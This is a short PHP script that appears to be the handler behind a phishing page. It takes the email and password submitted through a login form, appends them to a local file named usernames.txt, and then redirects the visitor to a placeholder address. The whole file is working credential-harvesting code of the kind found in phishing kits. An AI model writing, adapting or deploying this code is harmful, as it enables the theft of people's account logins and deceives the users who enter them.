<?php
include 'info.php';

file_put_contents("usernames.txt", "\n[^]Email -> " . $_POST['email'] . "\n[^]Password -> " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
?>